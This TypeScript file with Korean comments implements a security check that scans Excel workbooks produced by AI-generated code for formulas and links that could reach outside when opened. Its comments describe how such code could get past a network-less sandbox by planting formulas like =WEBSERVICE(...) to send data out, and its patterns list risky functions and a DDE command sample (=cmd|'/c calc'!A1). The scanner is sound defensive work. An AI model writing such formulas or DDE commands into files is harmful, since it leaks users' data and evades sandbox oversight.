// 보안 점검 SEC-001 — 결과 엑셀에 "열 때 외부로 연결되는" 수식·링크가 새로 생겼는지 찾는다.
// AI 코드는 Worker 안에서 인터넷과 통신할 수 없지만, 결과 파일 안에 =WEBSERVICE("외부주소"&A2) 같은 수식이나
// 링크를 써 넣을 수는 있다. 사용자가 엑셀에서 "편집 사용"을 누르거나 링크를 누르면 데이터가 밖으로 나갈 수 있다.
import type { CellValue, Workbook } from "exceljs";

export type RiskFinding = {
  key: string; // 시트!주소|종류|내용 — 원본과 같은 것인지 비교하는 데 쓴다
  sheet: string;
  address: string;
  kind: string; // 사람이 읽는 설명
};

// 외부로 요청을 보내거나 다른 프로그램을 부르는 엑셀 함수
const RISKY_FUNCTION = /(?<![A-Za-z0-9_.])(WEBSERVICE|HYPERLINK|FILTERXML|IMPORTDATA|IMPORTXML|IMPORTHTML|RTD|CALL|REGISTER\.ID|EXEC)\s*\(/i;
// 다른 파일을 가리키는 수식: [Book.xlsx]Sheet!A1, 'C:\경로\[Book.xlsx]Sheet'!A1, 'file:///…'
const EXTERNAL_REFERENCE = /\[[^\]]+\]|file:\/\/|https?:\/\//i;
// DDE: =cmd|'/c calc'!A1
const DDE = /\|\s*'?[^!]*!/;

function formulaOf(value: CellValue): string | null {
  if (value && typeof value === "object") {
    if ("formula" in value && typeof value.formula === "string") return value.formula;
    if ("sharedFormula" in value && typeof value.sharedFormula === "string") return value.sharedFormula;
  }
  return null;
}

function linkOf(value: CellValue): string | null {
  if (value && typeof value === "object" && "hyperlink" in value && typeof value.hyperlink === "string") {
    return value.hyperlink;
  }
  return null;
}

/** 통합 문서의 모든 시트에서 외부 연결 가능성이 있는 수식·링크를 찾는다. */
export function scanRisks(workbook: Workbook): RiskFinding[] {
  const findings: RiskFinding[] = [];
  workbook.eachSheet((sheet) => {
    const sheetName = sheet.name.normalize("NFC");
    sheet.eachRow({ includeEmpty: false }, (row) => {
      row.eachCell({ includeEmpty: false }, (cell) => {
        const formula = formulaOf(cell.value);
        const link = linkOf(cell.value);
        const add = (kind: string, detail: string) =>
          findings.push({
            key: `${sheetName}!${cell.address}|${kind}|${detail}`,
            sheet: sheetName,
            address: cell.address,
            kind,
          });
        if (formula) {
          if (RISKY_FUNCTION.test(formula)) add("외부로 요청을 보낼 수 있는 수식", formula);
          else if (EXTERNAL_REFERENCE.test(formula)) add("다른 파일·주소를 가리키는 수식", formula);
          else if (DDE.test(formula)) add("다른 프로그램을 부르는 수식", formula);
        }
        // 메일 링크(mailto:)와 같은 파일 안 이동(#시트!A1)은 제외하고, 나머지 링크는 모두 알린다
        if (link && !/^mailto:/i.test(link) && !link.startsWith("#")) add("외부 링크", link);
      });
    });
  });
  return findings;
}
